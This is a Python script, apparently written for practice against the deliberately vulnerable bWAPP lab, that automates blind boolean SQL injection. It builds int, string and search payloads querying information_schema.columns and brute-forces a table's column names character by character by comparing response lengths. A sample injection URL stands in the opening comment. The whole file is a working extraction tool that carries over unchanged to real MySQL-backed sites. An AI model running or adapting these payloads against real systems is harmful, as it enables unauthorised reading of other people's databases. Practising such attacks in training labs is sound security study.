# -*-coding:utf-8-*-

# http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?action=go&movie=100 or if((select ascii(substr((select column_name from information_schema.columns where table_name=0x61646D696E limit 0,1),1,1))=97),1,0)
from global_data import glovar, glofun


def get_coname(url=glovar.url3, cookie=False, type='search',
               tbname='admin', cocount=3):
    response_length = 0

    coname = ""

    coname_list = []

    hex_tbname = glofun.string_convert_to_hex(tbname)

    if type == 'int':
        payload = '+or+if((select+ascii(substr((select+column_name+from+information_schema.columns+where+table_name=' + hex_tbname + '+limit+{coname_order_number},1),{coname_str_location},1))={ascii_number}),1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+ascii(substr((select+column_name+from+information_schema.columns+where+table_name=' + hex_tbname + '+limit+{coname_order_number},1),{coname_str_location},1))={ascii_number}),1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+ascii(substr((select+column_name+from+information_schema.columns+where+table_name=' + hex_tbname + '+limit+{coname_order_number},1),{coname_str_location},1))={ascii_number}),1,0)%23'

    payloads = ["0", "95", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109",
                "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]

    # _ 95    NULL 0
    for j in payloads:

        full_payload = url + payload.format(coname_order_number=str(0), coname_str_location=str(1),
                                            ascii_number=str(j))

        url_read_length = len(glofun.url_request(full_payload, cookie))

        if (url_read_length - response_length) > 50:
            response_length = url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包


    for i in range(0, cocount):

        for k in range(1, 35):

            for j in payloads:

                full_payload = url + payload.format(coname_order_number=str(i), coname_str_location=str(k),
                                                    ascii_number=str(j))

                url_read_length = len(glofun.url_request(full_payload, cookie))

                if (response_length - url_read_length) < 50:  # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包

                    if k != 1:

                        if j == '0':

                            coname_list.append(coname)

                            print(coname)

                            coname = ""

                            break

                    coname += chr(int(j))

                    print(coname)

                    # 如果返回了0，说明返回的是NULL,到了表名字的结果，跳出，寻找下一个表

            # 跳出多重循环
            else:

                continue

            break

    print(coname_list)
    return coname_list


if __name__ == "__main__":

    #get_coname(url=glovar.url3,tbname='comment')

    get_coname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', cocount=7)
